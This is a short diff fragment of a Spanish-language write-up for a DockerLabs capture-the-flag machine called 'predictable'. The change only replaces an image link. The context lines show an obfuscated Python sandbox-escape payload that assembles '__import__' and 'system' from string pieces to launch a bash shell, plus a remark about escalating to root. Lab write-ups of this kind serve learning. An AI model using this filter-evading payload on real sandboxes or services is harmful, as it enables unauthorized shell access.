@@ -50,7 +50,7 @@ y encontré:
 
       __builtins__.__dict__['__imp'+'ort__']('o'+'s').__dict__['sys'+'tem']('bash')
 
-![[dockerlabs/dificil/predictable/codigo2.png]]
+![image](https://github.com/user-attachments/assets/905a06e0-d187-4692-9f69-400d7618c45b)
 
 obtenemos acceso, ahora a escalar hacia root
 
